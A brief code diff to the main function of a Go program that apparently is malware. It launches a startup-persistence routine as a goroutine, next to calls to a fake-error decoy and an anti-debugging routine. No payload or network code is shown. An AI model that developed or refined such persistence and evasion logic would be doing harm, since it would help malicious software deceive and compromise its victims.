@@ -43,7 +43,7 @@ func main() {
 
 	if !program.IsInStartupPath() {
 		go fakeerror.Run()
-		startup.Run()
+		go startup.Run()
 	}
 
 	antidebug.Run()
